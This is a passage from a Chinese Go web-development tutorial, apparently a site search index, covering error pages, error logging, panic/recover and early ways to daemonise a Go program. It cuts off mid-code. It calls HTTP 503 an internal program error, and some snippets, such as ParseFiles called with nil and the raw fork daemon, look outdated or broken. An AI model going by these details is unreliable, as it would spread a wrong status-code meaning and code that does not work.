<p>\u6587\u4ef6\u7cfb\u7edf\u548c\u6743\u9650\uff1a\u5e94\u7528\u8bfb\u53d6\u4e0d\u5b58\u5728\u7684\u6587\u4ef6\uff0c\u6216\u8005\u8bfb\u53d6\u6ca1\u6709\u6743\u9650\u7684\u6587\u4ef6\u3001\u6216\u8005\u5199\u5165\u4e00\u4e2a\u4e0d\u5141\u8bb8\u5199\u5165\u7684\u6587\u4ef6\uff0c\u8fd9\u4e9b\u90fd\u4f1a\u5bfc\u81f4\u4e00\u4e2a\u9519\u8bef\u3002\u5e94\u7528\u8bfb\u53d6\u7684\u6587\u4ef6\u5982\u679c\u683c\u5f0f\u4e0d\u6b63\u786e\u4e5f\u4f1a\u62a5\u9519\uff0c\u4f8b\u5982\u914d\u7f6e\u6587\u4ef6\u5e94\u8be5\u662fini\u7684\u914d\u7f6e\u683c\u5f0f\uff0c\u800c\u8bbe\u7f6e\u6210\u4e86json\u683c\u5f0f\u5c31\u4f1a\u62a5\u9519\u3002</p> </li> <li>\u7b2c\u4e09\u65b9\u5e94\u7528\uff1a\u5982\u679c\u6211\u4eec\u7684\u5e94\u7528\u7a0b\u5e8f\u8026\u5408\u4e86\u5176\u4ed6\u7b2c\u4e09\u65b9\u63a5\u53e3\u7a0b\u5e8f\uff0c\u4f8b\u5982\u5e94\u7528\u7a0b\u5e8f\u53d1\u8868\u6587\u7ae0\u4e4b\u540e\u81ea\u52a8\u8c03\u7528\u63a5\u53d1\u5fae\u535a\u7684\u63a5\u53e3\uff0c\u6240\u4ee5\u8fd9\u4e2a\u63a5\u53e3\u5fc5\u987b\u6b63\u5e38\u8fd0\u884c\u624d\u80fd\u5b8c\u6210\u6211\u4eec\u53d1\u8868\u4e00\u7bc7\u6587\u7ae0\u7684\u529f\u80fd\u3002</li> </ul> </li> <li> <p>HTTP\u9519\u8bef\uff1a\u8fd9\u4e9b\u9519\u8bef\u662f\u6839\u636e\u7528\u6237\u7684\u8bf7\u6c42\u51fa\u73b0\u7684\u9519\u8bef\uff0c\u6700\u5e38\u89c1\u7684\u5c31\u662f404\u9519\u8bef\u3002\u867d\u7136\u53ef\u80fd\u4f1a\u51fa\u73b0\u5f88\u591a\u4e0d\u540c\u7684\u9519\u8bef\uff0c\u4f46\u5176\u4e2d\u6bd4\u8f83\u5e38\u89c1\u7684\u9519\u8bef\u8fd8\u6709401\u672a\u6388\u6743\u9519\u8bef(\u9700\u8981\u8ba4\u8bc1\u624d\u80fd\u8bbf\u95ee\u7684\u8d44\u6e90)\u3001403\u7981\u6b62\u9519\u8bef(\u4e0d\u5141\u8bb8\u7528\u6237\u8bbf\u95ee\u7684\u8d44\u6e90)\u548c503\u9519\u8bef(\u7a0b\u5e8f\u5185\u90e8\u51fa\u9519)\u3002</p> </li> <li>\u64cd\u4f5c\u7cfb\u7edf\u51fa\u9519\uff1a\u8fd9\u7c7b\u9519\u8bef\u90fd\u662f\u7531\u4e8e\u5e94\u7528\u7a0b\u5e8f\u4e0a\u7684\u64cd\u4f5c\u7cfb\u7edf\u51fa\u73b0\u9519\u8bef\u5f15\u8d77\u7684\uff0c\u4e3b\u8981\u6709\u64cd\u4f5c\u7cfb\u7edf\u7684\u8d44\u6e90\u88ab\u5206\u914d\u5b8c\u4e86\uff0c\u5bfc\u81f4\u6b7b\u673a\uff0c\u8fd8\u6709\u64cd\u4f5c\u7cfb\u7edf\u7684\u78c1\u76d8\u6ee1\u4e86\uff0c\u5bfc\u81f4\u65e0\u6cd5\u5199\u5165\uff0c\u8fd9\u6837\u5c31\u4f1a\u5f15\u8d77\u5f88\u591a\u9519\u8bef\u3002</li> <li>\u7f51\u7edc\u51fa\u9519\uff1a\u6307\u4e24\u65b9\u9762\u7684\u9519\u8bef\uff0c\u4e00\u65b9\u9762\u662f\u7528\u6237\u8bf7\u6c42\u5e94\u7528\u7a0b\u5e8f\u7684\u65f6\u5019\u51fa\u73b0\u7f51\u7edc\u65ad\u5f00\uff0c\u8fd9\u6837\u5c31\u5bfc\u81f4\u8fde\u63a5\u4e2d\u65ad\uff0c\u8fd9\u79cd\u9519\u8bef\u4e0d\u4f1a\u9020\u6210\u5e94\u7528\u7a0b\u5e8f\u7684\u5d29\u6e83\uff0c\u4f46\u662f\u4f1a\u5f71\u54cd\u7528\u6237\u8bbf\u95ee\u7684\u6548\u679c\uff1b\u53e6\u4e00\u65b9\u9762\u662f\u5e94\u7528\u7a0b\u5e8f\u8bfb\u53d6\u5176\u4ed6\u7f51\u7edc\u4e0a\u7684\u6570\u636e\uff0c\u5176\u4ed6\u7f51\u7edc\u65ad\u5f00\u4f1a\u5bfc\u81f4\u8bfb\u53d6\u5931\u8d25\uff0c\u8fd9\u79cd\u9700\u8981\u5bf9\u5e94\u7528\u7a0b\u5e8f\u505a\u6709\u6548\u7684\u6d4b\u8bd5\uff0c\u80fd\u591f\u907f\u514d\u8fd9\u7c7b\u95ee\u9898\u51fa\u73b0\u7684\u60c5\u51b5\u4e0b\u7a0b\u5e8f\u5d29\u6e83\u3002</li> </ul>"},{"location":"12.2/#_1","title":"\u9519\u8bef\u5904\u7406\u7684\u76ee\u6807","text":"<p>\u5728\u5b9e\u73b0\u9519\u8bef\u5904\u7406\u4e4b\u524d\uff0c\u6211\u4eec\u5fc5\u987b\u660e\u786e\u9519\u8bef\u5904\u7406\u60f3\u8981\u8fbe\u5230\u7684\u76ee\u6807\u662f\u4ec0\u4e48\uff0c\u9519\u8bef\u5904\u7406\u7cfb\u7edf\u5e94\u8be5\u5b8c\u6210\u4ee5\u4e0b\u5de5\u4f5c\uff1a</p> <ul> <li>\u901a\u77e5\u8bbf\u95ee\u7528\u6237\u51fa\u73b0\u9519\u8bef\u4e86\uff1a\u4e0d\u8bba\u51fa\u73b0\u7684\u662f\u4e00\u4e2a\u7cfb\u7edf\u9519\u8bef\u8fd8\u662f\u7528\u6237\u9519\u8bef\uff0c\u7528\u6237\u90fd\u5e94\u5f53\u77e5\u9053Web\u5e94\u7528\u51fa\u4e86\u95ee\u9898\uff0c\u7528\u6237\u7684\u8fd9\u6b21\u8bf7\u6c42\u65e0\u6cd5\u6b63\u786e\u7684\u5b8c\u6210\u4e86\u3002\u4f8b\u5982\uff0c\u5bf9\u4e8e\u7528\u6237\u7684\u9519\u8bef\u8bf7\u6c42\uff0c\u6211\u4eec\u663e\u793a\u4e00\u4e2a\u7edf\u4e00\u7684\u9519\u8bef\u9875\u9762(404.html)\u3002\u51fa\u73b0\u7cfb\u7edf\u9519\u8bef\u65f6\uff0c\u6211\u4eec\u901a\u8fc7\u81ea\u5b9a\u4e49\u7684\u9519\u8bef\u9875\u9762\u663e\u793a\u7cfb\u7edf\u6682\u65f6\u4e0d\u53ef\u7528\u4e4b\u7c7b\u7684\u9519\u8bef\u9875\u9762(error.html)\u3002</li> <li>\u8bb0\u5f55\u9519\u8bef\uff1a\u7cfb\u7edf\u51fa\u73b0\u9519\u8bef\uff0c\u4e00\u822c\u5c31\u662f\u6211\u4eec\u8c03\u7528\u51fd\u6570\u7684\u65f6\u5019\u8fd4\u56deerr\u4e0d\u4e3anil\u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u4f7f\u7528\u524d\u9762\u5c0f\u8282\u4ecb\u7ecd\u7684\u65e5\u5fd7\u7cfb\u7edf\u8bb0\u5f55\u5230\u65e5\u5fd7\u6587\u4ef6\u3002\u5982\u679c\u662f\u4e00\u4e9b\u81f4\u547d\u9519\u8bef\uff0c\u5219\u901a\u8fc7\u90ae\u4ef6\u901a\u77e5\u7cfb\u7edf\u7ba1\u7406\u5458\u3002\u4e00\u822c404\u4e4b\u7c7b\u7684\u9519\u8bef\u4e0d\u9700\u8981\u53d1\u9001\u90ae\u4ef6\uff0c\u53ea\u9700\u8981\u8bb0\u5f55\u5230\u65e5\u5fd7\u7cfb\u7edf\u3002</li> <li>\u56de\u6eda\u5f53\u524d\u7684\u8bf7\u6c42\u64cd\u4f5c\uff1a\u5982\u679c\u4e00\u4e2a\u7528\u6237\u8bf7\u6c42\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u4e86\u4e00\u4e2a\u670d\u52a1\u5668\u9519\u8bef\uff0c\u90a3\u4e48\u5df2\u5b8c\u6210\u7684\u64cd\u4f5c\u9700\u8981\u56de\u6eda\u3002\u4e0b\u9762\u6765\u770b\u4e00\u4e2a\u4f8b\u5b50\uff1a\u4e00\u4e2a\u7cfb\u7edf\u5c06\u7528\u6237\u9012\u4ea4\u7684\u8868\u5355\u4fdd\u5b58\u5230\u6570\u636e\u5e93\uff0c\u5e76\u5c06\u8fd9\u4e2a\u6570\u636e\u9012\u4ea4\u5230\u4e00\u4e2a\u7b2c\u4e09\u65b9\u670d\u52a1\u5668\uff0c\u4f46\u662f\u7b2c\u4e09\u65b9\u670d\u52a1\u5668\u6302\u4e86\uff0c\u8fd9\u5c31\u5bfc\u81f4\u4e00\u4e2a\u9519\u8bef\uff0c\u90a3\u4e48\u5148\u524d\u5b58\u50a8\u5230\u6570\u636e\u5e93\u7684\u8868\u5355\u6570\u636e\u5e94\u8be5\u5220\u9664(\u5e94\u544a\u77e5\u65e0\u6548)\uff0c\u800c\u4e14\u5e94\u8be5\u901a\u77e5\u7528\u6237\u7cfb\u7edf\u51fa\u73b0\u9519\u8bef\u4e86\u3002</li> <li>\u4fdd\u8bc1\u73b0\u6709\u7a0b\u5e8f\u53ef\u8fd0\u884c\u53ef\u670d\u52a1\uff1a\u6211\u4eec\u77e5\u9053\u6ca1\u6709\u4eba\u80fd\u4fdd\u8bc1\u7a0b\u5e8f\u4e00\u5b9a\u80fd\u591f\u4e00\u76f4\u6b63\u5e38\u7684\u8fd0\u884c\u7740\uff0c\u4e07\u4e00\u54ea\u4e00\u5929\u7a0b\u5e8f\u5d29\u6e83\u4e86\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u9700\u8981\u8bb0\u5f55\u9519\u8bef\uff0c\u7136\u540e\u7acb\u523b\u8ba9\u7a0b\u5e8f\u91cd\u65b0\u8fd0\u884c\u8d77\u6765\uff0c\u8ba9\u7a0b\u5e8f\u7ee7\u7eed\u63d0\u4f9b\u670d\u52a1\uff0c\u7136\u540e\u518d\u901a\u77e5\u7cfb\u7edf\u7ba1\u7406\u5458\uff0c\u901a\u8fc7\u65e5\u5fd7\u7b49\u627e\u51fa\u95ee\u9898\u3002</li> </ul>"},{"location":"12.2/#_2","title":"\u5982\u4f55\u5904\u7406\u9519\u8bef","text":"<p>\u9519\u8bef\u5904\u7406\u5176\u5b9e\u6211\u4eec\u5df2\u7ecf\u5728\u5341\u4e00\u7ae0\u7b2c\u4e00\u5c0f\u8282\u91cc\u9762\u6709\u8fc7\u4ecb\u7ecd\u5982\u4f55\u8bbe\u8ba1\u9519\u8bef\u5904\u7406\uff0c\u8fd9\u91cc\u6211\u4eec\u518d\u4ece\u4e00\u4e2a\u4f8b\u5b50\u8be6\u7ec6\u7684\u8bb2\u89e3\u4e00\u4e0b\uff0c\u5982\u4f55\u6765\u5904\u7406\u4e0d\u540c\u7684\u9519\u8bef\uff1a</p> <ul> <li> <p>\u901a\u77e5\u7528\u6237\u51fa\u73b0\u9519\u8bef\uff1a</p> <p>\u901a\u77e5\u7528\u6237\u5728\u8bbf\u95ee\u9875\u9762\u7684\u65f6\u5019\u6211\u4eec\u53ef\u4ee5\u6709\u4e24\u79cd\u9519\u8bef\uff1a404.html\u548cerror.html\uff0c\u4e0b\u9762\u5206\u522b\u663e\u793a\u4e86\u9519\u8bef\u9875\u9762\u7684\u6e90\u7801\uff1a</p> </li> </ul> <p><pre><code>    &lt;html lang=\"en\"&gt;\n    &lt;head&gt;\n        &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"&gt;\n        &lt;title&gt;\u627e\u4e0d\u5230\u9875\u9762&lt;/title&gt;\n        &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n\n    &lt;/head&gt;\n    &lt;body&gt;\n    &lt;div class=\"container\"&gt;\n        &lt;div class=\"row\"&gt;\n            &lt;div class=\"span10\"&gt;\n                &lt;div class=\"hero-unit\"&gt;\n                    &lt;h1&gt;404!&lt;/h1&gt;\n                    &lt;p&gt;{{.ErrorInfo}}&lt;/p&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;&lt;!--/span--&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;\n    &lt;/body&gt;\n    &lt;/html&gt;\n</code></pre>     \u53e6\u4e00\u4e2a\u6e90\u7801\uff1a</p> <p><pre><code>    &lt;html lang=\"en\"&gt;\n    &lt;head&gt;\n        &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"&gt;\n        &lt;title&gt;\u7cfb\u7edf\u9519\u8bef\u9875\u9762&lt;/title&gt;\n        &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n\n    &lt;/head&gt;\n    &lt;body&gt;\n    &lt;div class=\"container\"&gt;\n        &lt;div class=\"row\"&gt;\n            &lt;div class=\"span10\"&gt;\n                &lt;div class=\"hero-unit\"&gt;\n                    &lt;h1&gt;\u7cfb\u7edf\u6682\u65f6\u4e0d\u53ef\u7528!&lt;/h1&gt;\n                    &lt;p&gt;{{.ErrorInfo}}&lt;/p&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;&lt;!--/span--&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;\n    &lt;/body&gt;\n    &lt;/html&gt;\n</code></pre>     404\u7684\u9519\u8bef\u5904\u7406\u903b\u8f91\uff0c\u5982\u679c\u662f\u7cfb\u7edf\u7684\u9519\u8bef\u4e5f\u662f\u7c7b\u4f3c\u7684\u64cd\u4f5c\uff0c\u540c\u65f6\u6211\u4eec\u770b\u5230\u5728\uff1a</p> <pre><code>    func (p *MyMux) ServeHTTP(w http.ResponseWriter, r *http.Request) {\nif r.URL.Path == \"/\" {\nsayhelloName(w, r)\nreturn\n}\nNotFound404(w, r)\nreturn\n}\n\nfunc NotFound404(w http.ResponseWriter, r *http.Request) {\nlog.Error(\"\u9875\u9762\u627e\u4e0d\u5230\")   //\u8bb0\u5f55\u9519\u8bef\u65e5\u5fd7\nt, _ = t.ParseFiles(\"tmpl/404.html\", nil)  //\u89e3\u6790\u6a21\u677f\u6587\u4ef6\nErrorInfo := \"\u6587\u4ef6\u627e\u4e0d\u5230\" //\u83b7\u53d6\u5f53\u524d\u62a5\u9519\u4fe1\u606f\nt.Execute(w, ErrorInfo)  //\u6267\u884c\u6a21\u677f\u7684merger\u64cd\u4f5c\n}\n\nfunc SystemError(w http.ResponseWriter, r *http.Request) {\nlog.Critical(\"\u7cfb\u7edf\u9519\u8bef\")   //\u7cfb\u7edf\u9519\u8bef\u89e6\u53d1\u4e86Critical\uff0c\u90a3\u4e48\u4e0d\u4ec5\u4f1a\u8bb0\u5f55\u65e5\u5fd7\u8fd8\u4f1a\u53d1\u9001\u90ae\u4ef6\nt, _ = t.ParseFiles(\"tmpl/error.html\", nil)  //\u89e3\u6790\u6a21\u677f\u6587\u4ef6\nErrorInfo := \"\u7cfb\u7edf\u6682\u65f6\u4e0d\u53ef\u7528\" //\u83b7\u53d6\u5f53\u524d\u62a5\u9519\u4fe1\u606f\nt.Execute(w, ErrorInfo)  //\u6267\u884c\u6a21\u677f\u7684merger\u64cd\u4f5c\n}\n</code></pre>"},{"location":"12.2/#_3","title":"\u5982\u4f55\u5904\u7406\u5f02\u5e38","text":"<p>\u6211\u4eec\u77e5\u9053\u5728\u5f88\u591a\u5176\u4ed6\u8bed\u8a00\u4e2d\u6709try...catch\u5173\u952e\u8bcd\uff0c\u7528\u6765\u6355\u83b7\u5f02\u5e38\u60c5\u51b5\uff0c\u4f46\u662f\u5176\u5b9e\u5f88\u591a\u9519\u8bef\u90fd\u662f\u53ef\u4ee5\u9884\u671f\u53d1\u751f\u7684\uff0c\u800c\u4e0d\u9700\u8981\u5f02\u5e38\u5904\u7406\uff0c\u5e94\u8be5\u5f53\u505a\u9519\u8bef\u6765\u5904\u7406\uff0c\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48Go\u8bed\u8a00\u91c7\u7528\u4e86\u51fd\u6570\u8fd4\u56de\u9519\u8bef\u7684\u8bbe\u8ba1\uff0c\u8fd9\u4e9b\u51fd\u6570\u4e0d\u4f1apanic\uff0c\u4f8b\u5982\u5982\u679c\u4e00\u4e2a\u6587\u4ef6\u627e\u4e0d\u5230\uff0cos.Open\u8fd4\u56de\u4e00\u4e2a\u9519\u8bef\uff0c\u5b83\u4e0d\u4f1apanic\uff1b\u5982\u679c\u4f60\u5411\u4e00\u4e2a\u4e2d\u65ad\u7684\u7f51\u7edc\u8fde\u63a5\u5199\u6570\u636e\uff0cnet.Conn\u7cfb\u5217\u7c7b\u578b\u7684Write\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a\u9519\u8bef\uff0c\u5b83\u4eec\u4e0d\u4f1apanic\u3002\u8fd9\u4e9b\u72b6\u6001\u5728\u8fd9\u6837\u7684\u7a0b\u5e8f\u91cc\u90fd\u662f\u53ef\u4ee5\u9884\u671f\u7684\u3002\u4f60\u77e5\u9053\u8fd9\u4e9b\u64cd\u4f5c\u53ef\u80fd\u4f1a\u5931\u8d25\uff0c\u56e0\u4e3a\u8bbe\u8ba1\u8005\u5df2\u7ecf\u7528\u8fd4\u56de\u9519\u8bef\u6e05\u695a\u5730\u8868\u660e\u4e86\u8fd9\u4e00\u70b9\u3002\u8fd9\u5c31\u662f\u4e0a\u9762\u6240\u8bb2\u7684\u53ef\u4ee5\u9884\u671f\u53d1\u751f\u7684\u9519\u8bef\u3002</p> <p>\u4f46\u662f\u8fd8\u6709\u4e00\u79cd\u60c5\u51b5\uff0c\u6709\u4e00\u4e9b\u64cd\u4f5c\u51e0\u4e4e\u4e0d\u53ef\u80fd\u5931\u8d25\uff0c\u800c\u4e14\u5728\u4e00\u4e9b\u7279\u5b9a\u7684\u60c5\u51b5\u4e0b\u4e5f\u6ca1\u6709\u529e\u6cd5\u8fd4\u56de\u9519\u8bef\uff0c\u4e5f\u65e0\u6cd5\u7ee7\u7eed\u6267\u884c\uff0c\u8fd9\u6837\u60c5\u51b5\u5c31\u5e94\u8be5panic\u3002\u4e3e\u4e2a\u4f8b\u5b50\uff1a\u5982\u679c\u4e00\u4e2a\u7a0b\u5e8f\u8ba1\u7b97x[j]\uff0c\u4f46\u662fj\u8d8a\u754c\u4e86\uff0c\u8fd9\u90e8\u5206\u4ee3\u7801\u5c31\u4f1a\u5bfc\u81f4panic\uff0c\u50cf\u8fd9\u6837\u7684\u4e00\u4e2a\u4e0d\u53ef\u9884\u671f\u4e25\u91cd\u9519\u8bef\u5c31\u4f1a\u5f15\u8d77panic\uff0c\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5b83\u4f1a\u6740\u6389\u8fdb\u7a0b\uff0c\u5b83\u5141\u8bb8\u4e00\u4e2a\u6b63\u5728\u8fd0\u884c\u8fd9\u90e8\u5206\u4ee3\u7801\u7684goroutine\u4ece\u53d1\u751f\u9519\u8bef\u7684panic\u4e2d\u6062\u590d\u8fd0\u884c\uff0c\u53d1\u751fpanic\u4e4b\u540e\uff0c\u8fd9\u90e8\u5206\u4ee3\u7801\u540e\u9762\u7684\u51fd\u6570\u548c\u4ee3\u7801\u90fd\u4e0d\u4f1a\u7ee7\u7eed\u6267\u884c\uff0c\u8fd9\u662fGo\u7279\u610f\u8fd9\u6837\u8bbe\u8ba1\u7684\uff0c\u56e0\u4e3a\u8981\u533a\u522b\u4e8e\u9519\u8bef\u548c\u5f02\u5e38\uff0cpanic\u5176\u5b9e\u5c31\u662f\u5f02\u5e38\u5904\u7406\u3002\u5982\u4e0b\u4ee3\u7801\uff0c\u6211\u4eec\u671f\u671b\u901a\u8fc7uid\u6765\u83b7\u53d6User\u4e2d\u7684username\u4fe1\u606f\uff0c\u4f46\u662f\u5982\u679cuid\u8d8a\u754c\u4e86\u5c31\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u8fd9\u4e2a\u65f6\u5019\u5982\u679c\u6211\u4eec\u6ca1\u6709recover\u673a\u5236\uff0c\u8fdb\u7a0b\u5c31\u4f1a\u88ab\u6740\u6b7b\uff0c\u4ece\u800c\u5bfc\u81f4\u7a0b\u5e8f\u4e0d\u53ef\u670d\u52a1\u3002\u56e0\u6b64\u4e3a\u4e86\u7a0b\u5e8f\u7684\u5065\u58ee\u6027\uff0c\u5728\u4e00\u4e9b\u5730\u65b9\u9700\u8981\u5efa\u7acbrecover\u673a\u5236\u3002 <pre><code>func GetUser(uid int) (username string) {\ndefer func() {\nif x := recover(); x != nil {\nusername = \"\"\n}\n}()\n\nusername = User[uid]\nreturn\n}\n</code></pre> \u4e0a\u9762\u4ecb\u7ecd\u4e86\u9519\u8bef\u548c\u5f02\u5e38\u7684\u533a\u522b\uff0c\u90a3\u4e48\u6211\u4eec\u5728\u5f00\u53d1\u7a0b\u5e8f\u7684\u65f6\u5019\u5982\u4f55\u6765\u8bbe\u8ba1\u5462\uff1f\u89c4\u5219\u5f88\u7b80\u5355\uff1a\u5982\u679c\u4f60\u5b9a\u4e49\u7684\u51fd\u6570\u6709\u53ef\u80fd\u5931\u8d25\uff0c\u5b83\u5c31\u5e94\u8be5\u8fd4\u56de\u4e00\u4e2a\u9519\u8bef\u3002\u5f53\u6211\u8c03\u7528\u5176\u4ed6package\u7684\u51fd\u6570\u65f6\uff0c\u5982\u679c\u8fd9\u4e2a\u51fd\u6570\u5b9e\u73b0\u7684\u5f88\u597d\uff0c\u6211\u4e0d\u9700\u8981\u62c5\u5fc3\u5b83\u4f1apanic\uff0c\u9664\u975e\u6709\u771f\u6b63\u7684\u5f02\u5e38\u60c5\u51b5\u53d1\u751f\uff0c\u5373\u4f7f\u90a3\u6837\u4e5f\u4e0d\u5e94\u8be5\u662f\u6211\u53bb\u5904\u7406\u5b83\u3002\u800cpanic\u548crecover\u662f\u9488\u5bf9\u81ea\u5df1\u5f00\u53d1package\u91cc\u9762\u5b9e\u73b0\u7684\u903b\u8f91\uff0c\u9488\u5bf9\u4e00\u4e9b\u7279\u6b8a\u60c5\u51b5\u6765\u8bbe\u8ba1\u3002</p>"},{"location":"12.2/#_4","title":"\u5c0f\u7ed3","text":"<p>\u672c\u5c0f\u8282\u603b\u7ed3\u4e86\u5f53\u6211\u4eec\u7684Web\u5e94\u7528\u90e8\u7f72\u4e4b\u540e\u5982\u4f55\u5904\u7406\u5404\u79cd\u9519\u8bef\uff1a\u7f51\u7edc\u9519\u8bef\u3001\u6570\u636e\u5e93\u9519\u8bef\u3001\u64cd\u4f5c\u7cfb\u7edf\u9519\u8bef\u7b49\uff0c\u5f53\u9519\u8bef\u53d1\u751f\u65f6\uff0c\u6211\u4eec\u7684\u7a0b\u5e8f\u5982\u4f55\u6765\u6b63\u786e\u5904\u7406\uff1a\u663e\u793a\u53cb\u597d\u7684\u51fa\u9519\u754c\u9762\u3001\u56de\u6eda\u64cd\u4f5c\u3001\u8bb0\u5f55\u65e5\u5fd7\u3001\u901a\u77e5\u7ba1\u7406\u5458\u7b49\u64cd\u4f5c\uff0c\u6700\u540e\u4ecb\u7ecd\u4e86\u5982\u4f55\u6765\u6b63\u786e\u5904\u7406\u9519\u8bef\u548c\u5f02\u5e38\u3002\u4e00\u822c\u7684\u7a0b\u5e8f\u4e2d\u9519\u8bef\u548c\u5f02\u5e38\u5f88\u5bb9\u6613\u6df7\u6dc6\u7684\uff0c\u4f46\u662f\u5728Go\u4e2d\u9519\u8bef\u548c\u5f02\u5e38\u662f\u6709\u660e\u663e\u7684\u533a\u5206\uff0c\u6240\u4ee5\u544a\u8bc9\u6211\u4eec\u5728\u7a0b\u5e8f\u8bbe\u8ba1\u4e2d\u5904\u7406\u9519\u8bef\u548c\u5f02\u5e38\u5e94\u8be5\u9075\u5faa\u600e\u4e48\u6837\u7684\u539f\u5219\u3002</p>"},{"location":"12.2/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u5e94\u7528\u65e5\u5fd7</li> <li>\u4e0b\u4e00\u8282: \u5e94\u7528\u90e8\u7f72</li> </ul>"},{"location":"12.3/","title":"12.3 \u5e94\u7528\u90e8\u7f72","text":"<p>\u7a0b\u5e8f\u5f00\u53d1\u5b8c\u6bd5\u4e4b\u540e\uff0c\u6211\u4eec\u73b0\u5728\u8981\u90e8\u7f72Web\u5e94\u7528\u7a0b\u5e8f\u4e86\uff0c\u4f46\u662f\u6211\u4eec\u5982\u4f55\u6765\u90e8\u7f72\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u5462\uff1f\u56e0\u4e3aGo\u7a0b\u5e8f\u7f16\u8bd1\u4e4b\u540e\u662f\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u7f16\u5199\u8fc7C\u7a0b\u5e8f\u7684\u8bfb\u8005\u4e00\u5b9a\u77e5\u9053\u91c7\u7528daemon\u5c31\u53ef\u4ee5\u5b8c\u7f8e\u7684\u5b9e\u73b0\u7a0b\u5e8f\u540e\u53f0\u6301\u7eed\u8fd0\u884c\uff0c\u4f46\u662f\u76ee\u524dGo\u8fd8\u65e0\u6cd5\u5b8c\u7f8e\u7684\u5b9e\u73b0daemon\uff0c\u56e0\u6b64\uff0c\u9488\u5bf9Go\u7684\u5e94\u7528\u7a0b\u5e8f\u90e8\u7f72\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u7b2c\u4e09\u65b9\u5de5\u5177\u6765\u7ba1\u7406\uff0c\u7b2c\u4e09\u65b9\u7684\u5de5\u5177\u6709\u5f88\u591a\uff0c\u4f8b\u5982Supervisord\u3001upstart\u3001daemontools\u7b49\uff0c\u8fd9\u5c0f\u8282\u6211\u4ecb\u7ecd\u76ee\u524d\u81ea\u5df1\u7cfb\u7edf\u4e2d\u91c7\u7528\u7684\u5de5\u5177Supervisord\u3002</p>"},{"location":"12.3/#daemon","title":"daemon","text":"<p>\u76ee\u524dGo\u7a0b\u5e8f\u8fd8\u4e0d\u80fd\u5b9e\u73b0daemon\uff0c\u8be6\u7ec6\u7684\u89c1\u8fd9\u4e2aGo\u8bed\u8a00\u7684bug\uff1a&lt;<code>http://code.google.com/p/go/issues/detail?id=227</code>&gt;\uff0c\u5927\u6982\u7684\u610f\u601d\u8bf4\u5f88\u96be\u4ece\u73b0\u6709\u7684\u4f7f\u7528\u7684\u7ebf\u7a0b\u4e2dfork\u4e00\u4e2a\u51fa\u6765\uff0c\u56e0\u4e3a\u6ca1\u6709\u4e00\u79cd\u7b80\u5355\u7684\u65b9\u6cd5\u6765\u786e\u4fdd\u6240\u6709\u5df2\u7ecf\u4f7f\u7528\u7684\u7ebf\u7a0b\u7684\u72b6\u6001\u4e00\u81f4\u6027\u95ee\u9898\u3002</p> <p>\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5f88\u591a\u7f51\u4e0a\u7684\u4e00\u4e9b\u5b9e\u73b0daemon\u7684\u65b9\u6cd5\uff0c\u4f8b\u5982\u4e0b\u9762\u4e24\u79cd\u65b9\u5f0f\uff1a</p> <ul> <li>MarGo\u7684\u4e00\u4e2a\u5b9e\u73b0\u601d\u8def\uff0c\u4f7f\u7528Command\u6765\u6267\u884c\u81ea\u8eab\u7684\u5e94\u7528\uff0c\u5982\u679c\u771f\u60f3\u5b9e\u73b0\uff0c\u90a3\u4e48\u63a8\u8350\u8fd9\u79cd\u65b9\u6848</li> </ul> <pre><code>d := flag.Bool(\"d\", false, \"Whether or not to launch in the background(like a daemon)\")\nif *d {\ncmd := exec.Command(os.Args[0],\n\"-close-fds\",\n\"-addr\", *addr,\n\"-call\", *call,\n)\nserr, err := cmd.StderrPipe()\nif err != nil {\nlog.Fatalln(err)\n}\nerr = cmd.Start()\nif err != nil {\nlog.Fatalln(err)\n}\ns, err := ioutil.ReadAll(serr)\ns = bytes.TrimSpace(s)\nif bytes.HasPrefix(s, []byte(\"addr: \")) {\nfmt.Println(string(s))\ncmd.Process.Release()\n} else {\nlog.Printf(\"unexpected response from MarGo: `%s` error: `%v`\\n\", s, err)\ncmd.Process.Kill()\n}\n}\n</code></pre> <ul> <li>\u53e6\u4e00\u79cd\u662f\u5229\u7528syscall\u7684\u65b9\u6848\uff0c\u4f46\u662f\u8fd9\u4e2a\u65b9\u6848\u5e76\u4e0d\u5b8c\u5584\uff1a <pre><code>package main\n\nimport (\n\"log\"\n\"os\"\n\"syscall\"\n)\n\nfunc daemon(nochdir, noclose int) int {\nvar ret, ret2 uintptr\nvar err uintptr\n\ndarwin := syscall.OS == \"darwin\"\n\n// already a daemon\nif syscall.Getppid() == 1 {\nreturn 0\n}\n\n// fork off the parent process\nret, ret2, err = syscall.RawSyscall(syscall.SYS_FORK, 0, 0, 0)\nif err != 0 {\nreturn -1\n}\n\n// failure\nif ret2 &lt; 0 {\nos.Exit(-1)\n}\n\n// handle exception for darwin\nif darwin &amp;&amp; ret2 == 1 {\nret = 0\n}\n\n// if we got a good PID, then we call exit the parent process.\nif ret &gt; 0 {\nos.Exit(0)\n}\n\n/* Change the file mode mask */\n_ = syscall.Umask(0)\n\n// create a new SID for the child process\ns_ret, s_errno := syscall.Setsid()\nif s_errno != 0 {\nlog.Printf(\"Error: syscall.Setsid errno: %d\", s_errno)\n}\nif s_ret &lt; 0 {\nreturn -1\n}\n\nif nochdir == 0 {\nos.Chdir(\"/\")\n}\n\nif noclose == 0 {\nf, e := os.OpenFile(\"/dev/null\", os.O_RDWR, 0)\nif e == nil {\nfd := f.Fd()\nsyscall.Dup2(fd, os.Stdin.Fd())\nsyscall.Dup2(fd, 